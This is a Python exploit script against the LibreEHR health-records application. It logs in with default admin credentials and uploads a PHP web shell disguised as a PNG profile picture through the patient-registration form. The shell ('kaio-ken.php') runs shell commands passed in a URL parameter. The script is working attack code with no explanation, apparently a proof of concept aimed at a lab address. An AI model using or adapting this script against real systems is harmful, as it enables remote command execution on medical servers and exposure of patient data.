import requests, sys, re
from colorama import Fore, Back, Style

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}



C = [Style.RESET_ALL, Fore.RESET, Style.BRIGHT, Fore.BLUE, Fore.RED, Fore.GREEN, Fore.YELLOW]
info = C[2]+C[3]+'['+C[0]+C[2]+'-'+C[2]+C[3]+']'+C[0]+' '
err  = C[2]+C[4]+'['+C[0]+C[2]+'!'+C[2]+C[4]+']'+C[0]+' '
ok   = C[2]+C[5]+'['+C[0]+C[2]+'+'+C[2]+C[5]+']'+C[0]+' '

if __name__ == "__main__":
#1 | INIT
    SERVER_URL = 'http://172.16.65.130/LibreEHR/'
    if not re.match(r".*/$", SERVER_URL):
        SERVER_URL = SERVER_URL+'/'
    LOGIN_URL  = SERVER_URL+'interface/login/login.php'
    LOGIN_POST = SERVER_URL+'interface/main/main_screen.php?auth=login&site=default'
    UPLOAD_URL = SERVER_URL+'interface/new/new_comprehensive_save.php'
#2 | Create Session
    s = requests.Session()
    get_session = s.get(LOGIN_URL, verify=False, proxies=proxies)
    if get_session.status_code == 200:
        print(ok+'Successfully connected to server and created session.')
        print(info+get_session.headers['Set-Cookie'])
    else:
        print(err+'Cannot connect to the server and create a web session.')
    login_data = {'new_login_session_management':'1', 'authProvider':'Default','authUser':'admin','clearPass':'admin','languageChoice':'1'}
    auth = s.post(url=LOGIN_POST, data=login_data, verify=False, proxies=proxies)
#3 | File Upload
    PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
    png     = {
                'profile_picture': 
                  (
                    'kaio-ken.php', 
                    PNG_magicBytes+'\n'+'<?php echo shell_exec($_GET["telepathy"]); ?>', 
                    'image/png', 
                    {'Content-Disposition': 'form-data'}
                  ) 
              }
    fdata   = {'form_cb_1':'upload','form_fname':'Sun','form_mname':'','form_lname':'Wukong','form_sex':'Male','form_status':'','form_facility':''}
    r1 = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False)
    print r1.text
